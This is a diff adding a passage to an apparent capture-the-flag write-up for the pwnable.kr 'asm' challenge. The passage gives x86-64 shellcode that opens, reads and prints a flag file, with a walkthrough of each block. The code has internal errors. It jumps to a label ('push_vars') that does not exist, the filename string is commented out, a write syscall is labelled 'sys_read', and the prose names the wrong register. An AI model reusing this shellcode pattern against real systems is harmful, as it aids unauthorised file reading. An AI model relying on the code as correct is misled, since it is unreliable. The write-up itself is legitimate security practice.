@@ -108,4 +108,140 @@ asm: ELF 64-bit LSB shared object, x86-64
 ```
 
 ##Writing The Shellcode
+First we will write `payload.asm` program to open the flag and write it to stdout.
+Then compile `payload.asm` and use objdump to extract the opcodes and we will have our shellcode.
+Note this is not the most practical option as tools like pwntools.asm exist, but its fun to write and
+good practice in asm.
 
+Our `payload.asm` file:
+```
+;Author: Weston Silbaugh
+;the asm for our shellcode payload
+	section .mysec write exec alloc
+	global	main
+
+main:
+	jmp		push_vars
+s1:
+;add null char
+	xor		rax, rax
+	pop		rbx
+	push 		rbx
+	add		bx,231
+	mov		[ebx],eax
+;open:
+	add		al, 0x02	;sys_open
+	pop		rdi		;const char *fname
+	push 		rdi
+	xor		rsi, rsi	;int flags
+	xor		rdx, rdx	;int mode
+	syscall
+;read:
+	mov		rdi, rax	;int fd
+	xor		rax, rax	;sys_read
+	pop		rsi		;buff
+	push 		rsi
+	add		dx, 400		;size
+	syscall
+;write:
+	xor		eax, eax
+	add 		al, 0x01	;sys_read
+	xor		rdi, rdi
+	add		rdi, 1		;int fd
+	pop		rsi		;buff
+	;mov		rdx, 128	;size
+	syscall
+exit:
+	xor		rax, rax
+	xor		rdi, rdi
+	add		al, 60
+	syscall
+push_fname:
+	call	s1
+fname:
+	;db "/home/nuser/ctf/progress/pwnable.kr/asm/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
+nullchar:
+	db "a"
+```
+Normally we would want to make this payload smaller but with the generous `0x1000` its good enough.
+
+###Walkthrough of `payload.asm`:
+```
+	section .mysec write exec alloc
+	global	main
+```
+I make my own secton to allow it to be set to write. Its not needed in this asm but non the less its there
+```
+main:
+	jmp		push_vars
+s1:
+```
+Then we jump to push_vars which pushes the file to the stack and jumps back to `s1`
+```
+push_fname:
+	call	s1
+fname:
+	;db "/home/nuser/ctf/progress/pwnable.kr/asm/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
+nullchar:
+	db "a"
+```
+Since we can not reference a label for our string, a work around is required.
+The call to s1 pushes the address of our string onto the stack and jumps back to s1.
+The string is placed at the bottom of .mysec because if it was at the top, a near jump call would contain NULL characters.
+Making our string null terminated will have the same issue so it is left as an `a` character for now and will be changed at
+run time.
+```
+;add null char
+	xor		rax, rax
+	pop		rbx
+	push 		rbx
+	add		bx,231
+	mov		[ebx],eax
+```
+Once we return to `s1:`, our string is null terminated.
+
+Then the flag is opened for reading.
+```
+;open:
+	add		al, 0x02	;sys_open
+	pop		rdi		;const char *fname
+	push 		rdi
+	xor		rsi, rsi	;int flags
+	xor		rdx, rdx	;int mode
+	syscall
+```
+The filename string is on the stack so we simply pop it off into `RBX`
+
+Then we read the flag
+```
+;read:
+	mov		rdi, rax	;int fd
+	xor		rax, rax	;sys_read
+	pop		rsi		;buff
+	push 		rsi
+	add		dx, 400		;size
+	syscall
+```
+The string holding the filename is overwriten with the contents of the flag.
+
+And write the flags contents out to stdout.
+```
+;write:
+	xor		eax, eax
+	add 		al, 0x01	;sys_read
+	xor		rdi, rdi
+	add		rdi, 1		;int fd
+	pop		rsi		;buff
+	;mov		rdx, 128	;size
+	syscall
+```
+The string size is still in `rdx`.
+
+Then exit the program
+```
+exit:
+	xor		rax, rax
+	xor		rdi, rdi
+	add		al, 60
+	syscall
+```
